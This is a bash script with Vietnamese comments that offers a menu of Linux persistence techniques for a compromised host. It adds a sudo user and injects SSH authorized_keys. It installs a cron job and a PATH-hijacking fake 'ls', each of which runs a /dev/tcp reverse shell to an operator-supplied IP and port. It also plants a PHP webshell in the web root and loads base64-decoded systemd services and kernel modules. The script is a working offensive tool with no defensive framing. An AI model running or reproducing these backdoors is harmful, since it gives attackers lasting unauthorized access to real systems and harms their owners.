#!/bin/bash

#1. Ky thuat add new user
addUser () {
	#List user in /etc/passwd
	cat /etc/passwd
	echo -e "\nenter the username"
	read uname
	#check user exist in /etc/passwd
	while grep -q $uname /etc/passwd; do
		echo -e "\n$uname is exist, please enter new username"
		read uname
		#echo $uname
		if grep -q $uname /etc/passwd; then
			check="1"
		else
			check="0"
			break
		fi
	done
	
	sudo useradd $uname
	echo -e "\nadd username success"
	sudo usermod -aG sudo $uname
	echo -e "\nadd group success"
	sudo passwd $uname
}

#2. Ky thuat add SSH Authorized_keys
Authorized_keys () {
	#check user in /etc/passwd
	cat /etc/passwd
	
	echo -e "\nenter your username you want"
	read user
	#check folder /home/$user/.ssh exist
	if [ -d "/home/$user" ];then
					cd /home/$user/
	        if [ -d "/.ssh" ];then
	                cd /home/$user/.ssh
	                echo -e "\nenter the authorized_keys"
	                read pubKey
	                sudo echo "$pubKey" >> /home/$user/.ssh/authorized_keys
	                cat /home/$user/.ssh/authorized_keys
	        else
									#cd /home
									#mkdir $user
									#cd $user
									mkdir .ssh
	                cd /home/$user/.ssh
	                echo -e "\nenter the id_rsa.pub"
	                read pubKey
	                echo "$pubKey" > authorized_keys
	                echo "add public key success"
	        fi
	else
					mkdir $user
	        cd $user
	        mkdir .ssh
	        cd /home/$user/.ssh
	        echo -e "\nenter the id_rsa.pub"
	        read pubKey
	        echo "$pubKey" > authorized_keys
	        echo "add public key success"
	fi
}

#3. Ky thuat dung Crontab
useCrontab () {
	echo -e "\nenter your ip"
	read ip
	echo -e "\nenter your port"
	read port
	cd /tmp/
	echo "bash -i >& /dev/tcp/$ip/$port 0>&1" > shell.sh
	(crontab -l && echo "* * * * * bash /tmp/shell.sh") | crontab -
}

#4. Ky thuat su dung webshell
useWebshell () {
	cd /var/www/html/
	echo -e "\n enter your web shell"
	read shell
	echo -e "\n enter your filename"
	read filename
	echo "<?php $shell ?>" > $filename
	cat $filename
}


#5. Ky thuat tao Systemd service
addSysService () {
	echo -e "\nenter your service name"
	read serviceName
	cd /etc/systemd/system
	echo -e "\nenter your content of service"
	read serviceContent
	echo $serviceContent | base64 --decode > $serviceName
	cat $serviceName
	
	sudo systemctl enable $serviceName
	sudo systemctl start $serviceName
	sudo systemctl status $serviceName
}


#7. Ky thuat tao Kernel Module
addKernel () {
	
	sudo apt update
	sudo apt install build-essential
	cd /tmp
	mkdir kernel
	cd kernel
	echo -e "\nenter kernel's name"
	read kernelName
	kernelName_c=$kernelName.c
	echo -e "\nenter kernel's content"
	read kernelContent
	echo $kernelContent| base64 --decode > $kernelName_c
	
	echo -e "\nenter Makefile's name"
	read makeName
	echo -e "obj-m +=$kernelName.o" > $makeName
	echo -e "\nenter Makefile's content"
	read makeContinue
	echo $makeContinue | base64 --decode >> $makeName
	
	make
	ls
	koFile=$kernelName.ko
	sudo insmod $koFile
	lsmod
	tail /var/log/kern.log
}


#8. Ky thuat chen vao PATH
addPATH () {
	echo -e "\nenter your ip"
	read ip
	echo -e "\nenter your port"
	read port
	cd /tmp
	echo "bash -i >& /dev/tcp/$ip/$port 0>&1" > ls
	cat ls
	chmod +x ls
	export PATH=/tmp:$PATH
	echo $PATH
	exec bash
}


tutorial_texts="Choose your option.\n\t1. Add new user.\n\t2. Add Authorized_keys\n\t3. Crontab.\n\t4. Webshell.\n\t5. Systemd service.\n\t6. Unix shell.\n\t7. Kernel Module.\n\t8. Add PATH.\n\tOther. Unkown option."
option=9
while [[ $option -ge 9 ]] ; do
	echo -e $tutorial_texts
	read -p "Enter your option : " option
	case $option in
	    "1")
	        echo "Add new user."
					addUser
		;;
	    "2")
	        echo "Add Authorized_keys."
					Authorized_keys
	        ;;
	    "3")
	        echo "Crontab."
					useCrontab
	        ;;
	    "4")
	        echo "Webshell."
					useWebshell
	        ;;
	    "5")
	        echo "Systemd service."
					addSysService 
					;;
	    "6")
	        echo "Unix shell."
	        ;;
	    "7")
	        echo "Kernel Module."
					addKernel
	        ;;
			"8")
	        echo "Add PATH."
					addPATH 
	        ;;
	    *)
	        echo "Unknown option."
	        option=9
	        echo 
	        ;;
	esac
done